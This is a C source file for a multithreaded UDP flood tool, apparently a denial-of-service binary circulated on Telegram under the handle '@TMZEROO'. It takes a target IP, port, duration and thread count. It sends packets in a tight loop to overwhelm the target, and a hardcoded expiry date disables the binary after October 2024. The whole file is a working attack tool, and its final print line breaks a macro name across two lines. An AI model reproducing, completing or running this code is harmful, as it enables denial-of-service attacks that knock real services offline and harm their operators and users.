#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>

#define EXPIRY_YEAR 2024
#define EXPIRY_MONTH 10
#define EXPIRY_DAY 25

// Attack Finished Message
#define ATTACK_FINISHED "Attack Finished By @TMZEROO On TG\n"
// Attack Start Message
#define ATTACK_STARTED "Attack started by @TMZEROO From TG\n"
// Binary Closed Message
#define BINARY_CLOSED "Binary is Closed By @TMZEROO From TG\n"

int is_binary_expired() {
    time_t now = time(NULL);
    struct tm expiry_date = {0};
    expiry_date.tm_year = EXPIRY_YEAR - 1900;
    expiry_date.tm_mon = EXPIRY_MONTH - 1;
    expiry_date.tm_mday = EXPIRY_DAY;

    double seconds = difftime(mktime(&expiry_date), now);
    return seconds < 0;
}

void *send_udp_traffic(void *args) {
    char **argv = (char **)args;
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    int sockfd;
    struct sockaddr_in server_addr;
    char message[1024];

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    server_addr.sin_addr.s_addr = inet_addr(target_ip);

    snprintf(message, sizeof(message), "UDP Flood by @TMZEROO");

    time_t start_time = time(NULL);

    while (time(NULL) - start_time < duration) {
        sendto(sockfd, message, sizeof(message), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    close(sockfd);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
        exit(1);
    }

    if (is_binary_expired()) {
        printf("%s", BINARY_CLOSED);
        exit(1);
    }

    printf("%s", ATTACK_STARTED);

    int threads_count = atoi(argv[4]);
    int duration = atoi(argv[3]);
    if (duration > 1000) duration = 1000;

    pthread_t threads[threads_count];

    for (int i = 0; i < threads_count; i++) {
        if (pthread_create(&threads[i], NULL, send_udp_traffic, argv) != 0) {
            perror("Failed to create thread");
            exit(1);
        }
    }

    for (int i = 0; i < threads_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("%s", ATTACK_FINISHE
      D);

    return 0;
}
